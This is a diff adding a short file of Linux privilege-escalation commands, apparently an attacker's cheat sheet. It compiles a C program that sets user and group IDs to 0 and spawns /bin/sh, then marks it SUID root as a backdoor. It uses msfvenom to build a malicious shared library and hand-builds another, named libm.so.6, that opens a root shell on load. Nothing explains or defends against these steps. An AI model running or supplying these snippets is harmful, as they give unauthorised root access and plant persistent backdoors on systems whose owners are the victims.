@@ -1,0 +1,32 @@
+cat > pwnd.c <<EOF
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+void main(){
+setuid(0);
+setgid(0);
+system("/bin/sh");}
+EOF
+
+gcc pwnd.c -o pwnd
+
+chmod 4777 pwnd
+
+chown root:root pwnd
+chmod u+s pwnd
+
+msfvenom -p linux/x64/exec PrependSetgid=yes PrependSetuid=yes CMD=/bin/sh -f elf-so -o libm.so.6
+
+cat > woot.c <<EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+void woot(){
+setreuid(0,0);
+setregid(0,0);
+execl("/bin/sh","/bin/sh",NULL);}
+EOF
+
+gcc -fPIC -o woot.o -Wall -c woot.c
+gcc -Wall -shared -Wl,-soname,libm.so.6 -Wl,-init,woot -o libm.so.6 woot.o
